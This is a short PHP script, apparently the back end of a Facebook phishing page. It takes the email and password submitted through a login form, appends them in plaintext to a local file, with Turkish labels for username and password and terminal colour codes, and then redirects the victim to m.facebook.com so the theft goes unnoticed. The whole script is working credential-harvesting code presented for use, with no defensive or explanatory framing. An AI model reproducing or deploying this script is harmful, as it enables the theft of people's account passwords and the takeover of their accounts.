<?php

if (isset($_POST['email']) && isset($_POST['pass'])) {

$save = fopen("kaydedilen.txt","a+");
$kullaniciadi = $_POST['email'];
$password = $_POST['pass'];
$vericekilen = ("
\e[32m
	████████████████████████████████████████
	██
	██ \e[97mKULLANICI ADI : \e[32m".$kullaniciadi."\e[32m
	██
	████████████████████████████████████████


	████████████████████████████████████████
	██
	██ \e[97mŞİFRE         : \e[32m".$password."\e[32m
	██
	████████████████████████████████████████\e[97m
        
	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-");
fwrite($save,$vericekilen);
fclose($save);
header('Location: https://m.facebook.com');
}
?>
